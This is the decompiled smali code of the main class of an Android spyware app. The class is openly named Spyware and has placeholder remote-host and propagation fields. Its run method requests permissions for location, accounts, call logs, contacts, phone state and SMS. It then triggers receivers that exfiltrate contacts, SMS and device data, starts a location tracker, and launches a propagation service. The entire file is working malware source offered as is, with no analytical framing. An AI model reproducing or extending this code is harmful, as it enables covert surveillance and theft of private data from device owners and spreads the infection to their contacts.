.class public Landroid/spyware/Spyware;
.super Ljava/lang/Object;
.source "Spyware.java"


# static fields
.field public static final DEV_MODE:Z = false

.field public static final PROPAGATE:Ljava/lang/String; = "<PROPAGATE>"

.field public static final RHOST:Ljava/lang/String; = "<RHOST>"

.field public static final TAG:Ljava/lang/String; = "::trace"

.field public static final TIMER:I = 0x1e


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 40
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    .line 41
    iput-object v1, v0, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    .line 42
    return-void
.end method

.method private hasPermissions([Ljava/lang/String;)Z
    .registers 7
    .param p1, "permissions"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x0

    .line 45
    array-length v3, v6

    move v2, v1

    :goto_3
    if-ge v2, v3, :cond_13

    aget-object v0, v6, v2

    .line 46
    .local v0, "permission":Ljava/lang/String;
    iget-object v4, v5, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    invoke-static {v4, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    if-eqz v4, :cond_10

    .line 51
    .end local v0    # "permission":Ljava/lang/String;
    :goto_f
    return v1

    .line 45
    .restart local v0    # "permission":Ljava/lang/String;
    :cond_10
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    .line 51
    .end local v0    # "permission":Ljava/lang/String;
    :cond_13
    const/4 v1, 0x1

    goto :goto_f
.end method


# virtual methods
.method public run()V
    .registers 8

    .prologue
    .line 55
    const/16 v3, 0x8

    new-array v2, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "android.permission.ACCESS_COARSE_LOCATION"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "android.permission.ACCESS_FINE_LOCATION"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "android.permission.GET_ACCOUNTS"

    aput-object v4, v2, v3

    const/4 v3, 0x3

    const-string v4, "android.permission.READ_CALL_LOG"

    aput-object v4, v2, v3

    const/4 v3, 0x4

    const-string v4, "android.permission.READ_CONTACTS"

    aput-object v4, v2, v3

    const/4 v3, 0x5

    const-string v4, "android.permission.READ_PHONE_STATE"

    aput-object v4, v2, v3

    const/4 v3, 0x6

    const-string v4, "android.permission.READ_SMS"

    aput-object v4, v2, v3

    const/4 v3, 0x7

    const-string v4, "android.permission.SEND_SMS"

    aput-object v4, v2, v3

    .line 66
    .local v2, "permissions":[Ljava/lang/String;
    invoke-direct {v7, v2}, Landroid/spyware/Spyware;->hasPermissions([Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_3b

    .line 67
    const/4 v0, 0x0

    .line 68
    .local v0, "PERMISSIONS":I
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    check-cast v3, Landroid/app/Activity;

    invoke-static {v3, v2, v0}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 85
    .end local v0    # "PERMISSIONS":I
    :goto_3a
    return-void

    .line 70
    :cond_3b
    new-instance v1, Landroid/spyware/utils/Harvester;

    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    invoke-direct {v1, v3}, Landroid/spyware/utils/Harvester;-><init>(Landroid/content/Context;)V

    .line 72
    .local v1, "harvester":Landroid/spyware/utils/Harvester;
    invoke-virtual {v1}, Landroid/spyware/utils/Harvester;->isNetworkConnected()Z

    move-result v3

    if-eqz v3, :cond_8f

    .line 73
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v6, Landroid/spyware/receivers/ExfiltrateZombieR;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 74
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v6, Landroid/spyware/receivers/ExfiltrateContactR;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 75
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v6, Landroid/spyware/receivers/ExfiltrateSMSR;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 76
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v6, Landroid/spyware/services/TrackerS;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 83
    :goto_80
    iget-object v3, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v7, Landroid/spyware/Spyware;->context:Landroid/content/Context;

    const-class v6, Landroid/spyware/services/PropagateS;

    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_3a

    .line 79
    :cond_8f
    const-string v3, "::trace"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-class v5, Landroid/spyware/Spyware;

    invoke-virtual {v5}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "->run:no network connectivity"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_80
.end method
